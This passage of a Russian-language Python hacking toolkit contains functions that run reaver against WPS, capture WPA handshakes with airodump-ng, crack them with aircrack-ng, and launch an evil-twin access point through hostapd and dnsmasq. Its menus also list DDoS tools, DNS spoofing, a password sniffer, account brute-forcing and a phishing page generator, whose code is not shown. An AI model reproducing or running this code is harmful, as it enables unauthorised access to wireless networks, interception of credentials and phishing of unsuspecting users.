        cmd = f"reaver -i {interface}mon -b {bssid} -vv"
        print(Fore.CYAN + f"[*] Выполняется: {cmd}")
        os.system(cmd)

    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def capture_wpa_handshake():
    """Перехват рукопожатия WPA/WPA2"""
    print(Fore.CYAN + "\n[+] Перехват рукопожатия WPA/WPA2")

    try:
        if os.name == 'nt':
            print(Fore.RED + "[-] Эта функция доступна только в Linux")
            return

        bssid = input("Введите BSSID цели: ")
        channel = input("Введите канал цели: ")
        interface = input("Введите интерфейс (по умолчанию wlan0): ") or "wlan0"
        output_file = input("Введите имя файла для сохранения (по умолчанию handshake.cap): ") or "handshake.cap"

        print(Fore.YELLOW + f"[*] Перехват рукопожатия на {bssid}...")

        # Переводим интерфейс в мониторный режим
        os.system(f"airmon-ng start {interface}")

        # Запускаем перехват
        cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}mon"
        print(Fore.CYAN + f"[*] Выполняется: {cmd}")
        os.system(cmd)

        print(Fore.GREEN + f"\n[+] Ручопожатие сохранено в {output_file}.cap")

    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def crack_wifi_password():
    """Подбор пароля Wi-Fi по словарю"""
    print(Fore.CYAN + "\n[+] Подбор пароля Wi-Fi по словарю")

    try:
        if os.name == 'nt':
            print(Fore.RED + "[-] Эта функция доступна только в Linux")
            return

        handshake_file = input("Введите путь к файлу с рукопожатием (.cap): ")
        wordlist = input("Введите путь к словарю: ")

        print(Fore.YELLOW + f"[*] Запуск подбора пароля...")

        # Используем Aircrack-ng для подбора
        cmd = f"aircrack-ng {handshake_file} -w {wordlist}"
        print(Fore.CYAN + f"[*] Выполняется: {cmd}")
        os.system(cmd)

    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def evil_twin_attack():
    """Создание зловредной точки доступа (Evil Twin)"""
    print(Fore.CYAN + "\n[+] Создание Evil Twin точки доступа")

    try:
        if os.name == 'nt':
            print(Fore.RED + "[-] Эта функция доступна только в Linux")
            return

        ssid = input("Введите SSID для клонирования: ")
        interface = input("Введите интерфейс (по умолчанию wlan0): ") or "wlan0"

        print(Fore.YELLOW + f"[*] Создание Evil Twin для {ssid}...")

        # Создаем конфиг для hostapd
        with open("evil_twin.conf", "w") as f:
            f.write(f"interface={interface}mon\n")
            f.write(f"driver=nl80211\n")
            f.write(f"ssid={ssid}\n")
            f.write("channel=6\n")
            f.write("hw_mode=g\n")

        # Настраиваем DNS и DHCP
        os.system("dnsmasq -C dnsmasq.conf")

        # Запускаем точку доступа
        cmd = "hostapd evil_twin.conf"
        print(Fore.CYAN + f"[*] Выполняется: {cmd}")
        os.system(cmd)

        print(Fore.GREEN + f"\n[+] Evil Twin запущен! Пользователи могут подключаться к {ssid}")

    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def main():
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.CYAN + "Главное меню:  \n")
            print(Fore.WHITE + "1. Информационный поиск")
            print(Fore.WHITE + "2. Анализ сетей и устройств")
            print(Fore.WHITE + "3. Тестирование безопасности")
            print(Fore.WHITE + "4. Работа с кодом")
            print(Fore.WHITE + "5. Сетевые инструменты")
            print(Fore.WHITE + "6. Дополнительные инструменты")
            print(Fore.WHITE + "7. IoT и беспроводные сети")  # Новая категория
            print(Back.RED + " 0. Выход 99. О софте и кодере \n")
            print(Fore.YELLOW + "=" * 50)

            choice = input("\nВыберите категорию: ").strip()

            if choice == "1":
                information_gathering_menu()
            elif choice == "2":
                network_analysis_menu()
            elif choice == "3":
                security_testing_menu()
            elif choice == "4":
                code_tools_menu()
            elif choice == "5":
                network_tools_menu()
            elif choice == "6":
                additional_tools_menu()
            elif choice == "7":  # Новая категория
                iot_wireless_menu()
            elif choice == "99":
                soft()
            elif choice == "0":
                print(Fore.CYAN + "\nГуд Бай")
                break
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()
        print_banner()


def iot_wireless_menu():
    """Меню для IoT и беспроводных сетей"""
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.CYAN + "          IoT и беспроводные сети \n")
            print(Fore.WHITE + "1. Сканировать IoT устройства")
            print(Fore.WHITE + "2. Инструменты для Wi-Fi")
            print(Fore.WHITE + "0. Назад")

            choice = input("\nВыберите опцию: ").strip()

            if choice == "1":
                iot_scanner()
            elif choice == "2":
                wireless_exploits_menu()
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()
        
def information_gathering_menu():
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.CYAN + "Информационный поиск: \n")
            print(Fore.WHITE + "1. Поиск по IP")
            print(Fore.WHITE + "2. Поиск по никнейму в соцсетях")
            print(Fore.WHITE + "3. Поиск по номеру телефона")
            print(Fore.WHITE + "4. Поиск по метаданным изображения")
            print(Fore.WHITE + "5. WHOIS и DNS анализ домена")
            print(Fore.WHITE + "0. Назад")

            choice = input("\nВыберите опцию: ").strip()

            if choice == "1":
                ip_lookup()
            elif choice == "2":
                username_lookup()
            elif choice == "3":
                phone_lookup()
            elif choice == "4":
                metadata_lookup()
            elif choice == "5":
                domain = input("Введите домен (example.com): ")
                result = domain_analyzer(domain)
                print(json.dumps(result, indent=2, ensure_ascii=False))
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()

def network_analysis_menu():
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.CYAN + "Анализ сетей и устройств: \n")
            print(Fore.WHITE + "1. Сканирование локальной сети")
            print(Fore.WHITE + "2. Анализ WiFi сетей (базовый)")
            print(Fore.WHITE + "3. Расширенный анализ WiFi сетей")
            print(Fore.WHITE + "4. Сканер удаленных камер/устройств")
            print(Fore.WHITE + "5. Визуализация геолокации IP")
            print(Fore.WHITE + "0. Назад")

            choice = input("\nВыберите опцию: ").strip()

            if choice == "1":
                network_scanner()
            elif choice == "2":
                if os.name == 'nt':
                    wifi_analyzer()
                else:
                    interface = input("Введите интерфейс (по умолчанию wlan0): ") or "wlan0"
                    detailed = input("Показать детали (y/n)? ").lower() == 'y'
                    wifi_analyzer(interface, detailed)
            elif choice == "3":
                advanced_wifi_scanner()
            elif choice == "4":
                camera_scanner()
            elif choice == "5":
                ip_list = input("Введите IP: ").split(',')
                visualize_ip_locations([ip.strip() for ip in ip_list])
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()

def security_testing_menu():
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.CYAN + "Тестирование безопасности: \n")
            print(Fore.WHITE + "1. Сканер уязвимостей сайта")
            print(Fore.WHITE + "2. Сканер уязвимостей локальной сети")
            print(Fore.WHITE + "3. Проверка безопасности HTTP-заголовков")
            print(Fore.WHITE + "4. Анализатор зашифрованного трафика")
            print(Fore.WHITE + "0. Назад")

            choice = input("\nВыберите опцию: ").strip()

            if choice == "1":
                url = input("Введите URL сайта: ")
                result = website_vulnerability_scanner(url)
                print(json.dumps(result, indent=2, ensure_ascii=False))
            elif choice == "2":
                vulnerability_scanner()
            elif choice == "3":
                url = input("Введите URL сайта: ")
                response = requests.get(url)
                print(Fore.GREEN + "\n[+] HTTP-заголовки безопасности:")
                print(f"X-XSS-Protection: {response.headers.get('X-XSS-Protection', 'Отсутствует')}")
                print(f"Content-Security-Policy: {response.headers.get('Content-Security-Policy', 'Отсутствует')}")
                print(f"Strict-Transport-Security: {response.headers.get('Strict-Transport-Security', 'Отсутствует')}")
                print(f"X-Frame-Options: {response.headers.get('X-Frame-Options', 'Отсутствует')}")
            elif choice == "4":
                interface = input("Введите интерфейс (по умолчанию eth0): ") or "eth0"
                timeout = int(input("Время анализа в секундах (по умолчанию 30): ") or "30")
                traffic_analyzer(interface, timeout)
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()

def code_tools_menu():
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.CYAN + "Работа с кодом: \n")
            print(Fore.WHITE + "1. Деобфускация Python кода")
            print(Fore.WHITE + "2. Шифрование Python кода (PyArmor)")
            print(Fore.WHITE + "3. Компиляция Python в EXE")
            print(Fore.WHITE + "0. Назад")

            choice = input("\nВыберите опцию: ").strip()

            if choice == "1":
                deobfuscate_python_code()
            elif choice == "2":
                pyarmor_obfuscate()
            elif choice == "3":
                compile_to_exe()
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()

def network_tools_menu():
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.CYAN + "Сетевые инструменты: \n ")
            print(Fore.WHITE + "1. DDOS Tools")
            print(Fore.WHITE + "2. DNS Spoofing")
            print(Fore.WHITE + "3. Сниффер паролей")
            print(Fore.WHITE + "4. Брутфорс учетных записей")
            print(Fore.WHITE + "0. Назад")

            choice = input("\nВыберите опцию: ").strip()

            if choice == "1":
                ddos_menu()
            elif choice == "2":
                dns_spoofing()
            elif choice == "3":
                interface = input("Введите интерфейс (по умолчанию eth0): ") or "eth0"
                timeout = int(input("Время сниффинга в секундах (по умолчанию 30): ")) or "30"
                password_sniffer(interface, timeout)
            elif choice == "4":
                brute_force_menu()
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()

def additional_tools_menu():
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.CYAN + "Дополнительные инструменты: \n")
            print(Fore.WHITE + "1. Генератор фишинговых страниц")
            print(Fore.WHITE + "2. Проверка SSL-сертификата")
            print(Fore.WHITE + "3. Анализ открытых портов")
            print(Fore.WHITE + "0. Назад")

            choice = input("\nВыберите опцию: ").strip()

            if choice == "1":
                phishing_generator()
            elif choice == "2":
                domain = input("Введите домен (example.com): ")
                context = ssl.create_default_context()
                with socket.create_connection((domain, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=domain) as ssock:
                        cert = ssock.getpeercert()
                        print(Fore.GREEN + "\n[+] Информация о SSL сертификате:")
                        print(f"Издатель: {dict(x[0] for x in cert['issuer'])}")
                        print(f"Действителен с: {cert['notBefore']}")
                        print(f"Действителен до: {cert['notAfter']}")
                        print(f"Осталось дней: {(datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z') - datetime.now()).days}")
            elif choice == "3":
                target = input("Введите IP или домен: ")
                nm = nmap.PortScanner()
                nm.scan(target, arguments='-T4 --open')
                print(Fore.GREEN + "\n[+] Открытые порты:")
                for host in nm.all_hosts():
                    print(f"\nХост: {host} ({nm[host].hostname()})")
                    for proto in nm[host].all_protocols():
                        print(f"Протокол: {proto}")
                        ports = nm[host][proto].keys()
                        for port in sorted(ports):
                            print(f"  Порт: {port}\tСостояние: {nm[host][proto][port]['state']}")
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()
def poisk():
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.CYAN + "   Поиск данных \n")
            print(Back.GREEN + "")
            print(Fore.WHITE + "1. Поиск по IP")
            print(Fore.WHITE + "2. Поиск по никнейму в соцсетях")
            print(Fore.WHITE + "3. Поиск по номеру телефона")
            print(Fore.WHITE + "4. Поиск по метаданным изображения")
            print(Fore.WHITE + "0. Назад")

            try:
                choice = input("\nВыберите опцию: ").strip()
            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n[!] Для выхода введите 0 или зажмите Ctrl+C")
                continue

            if choice == "1":
                ip_lookup()
            elif choice == "2":
                username_lookup()
            elif choice == "3":
                phone_lookup()
            elif choice == "4":
                metadata_lookup()
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()

def wifi():
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.CYAN + "               Wi-Fi и сайты : \n")
            print(Fore.WHITE + "1. Визуализация данных (IP геолокация)")
            print(Fore.WHITE + "2. Анализ WiFi сетей")
            print(Fore.WHITE + "3. Сканер уязвимостей сайта")
            print(Fore.WHITE + "4. Анализ домена (WHOIS+DNS)")
            print(Fore.WHITE + "0. Назад")

            try:
                choice = input("\nВыберите опцию: ").strip()
            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n[!] Для выхода введите 0 или зажмите Ctrl+C")
                continue

            if choice == "1":
                try:
                    ip_list = input("Введите IP через запятую: ").split(',')
                    visualize_ip_locations([ip.strip() for ip in ip_list])
                except KeyboardInterrupt:
                    print(Fore.YELLOW + "\n[!] Отмена операции")
                    continue
            elif choice == "2":
                try:
                    if os.name == 'nt':
                        wifi_analyzer()
                    else:
                        interface = input("Введите интерфейс (по умолчанию wlan0): ") or "wlan0"
                        detailed = input("Показать детали (y/n)? ").lower() == 'y'
                        wifi_analyzer(interface, detailed)
                except KeyboardInterrupt:
                    print(Fore.YELLOW + "\n[!] Отмена операции")
                    continue
            elif choice == "3":
                url = input("Введите URL сайта: ")
                result = website_vulnerability_scanner(url)
                print(json.dumps(result, indent=2, ensure_ascii=False))
            elif choice == "4":
                domain = input("Введите домен (example.com): ")
                result = domain_analyzer(domain)
                print(json.dumps(result, indent=2, ensure_ascii=False))
                try:
                    ip_list = input("Введите IP: ").split(',')
                    visualize_ip_locations([ip.strip() for ip in ip_list])
                except KeyboardInterrupt:
                    print(Fore.YELLOW + "\n[!] Отмена операции")
                    continue
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()

def code():
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.CYAN + "  Работа с кодом \n")
            print(Back.GREEN + "")
            print(Fore.WHITE + "1. Деобфускация Python кода")
            print(Fore.WHITE + "2. Шифрование Python кода (PyArmor)")
            print(Fore.WHITE + "3. Компиляция Python в EXE")
            print(Fore.WHITE + "0. Назад")

            try:
                choice = input("\nВыберите опцию: ").strip()
            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n[!] Для выхода введите 0 или зажмите Ctrl+C")
                continue

            if choice == "1":
                deobfuscate_python_code()
            elif choice == "2":
                pyarmor_obfuscate()
            elif choice == "3":
                compile_to_exe()
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()

if __name__ == "__main__":
    main()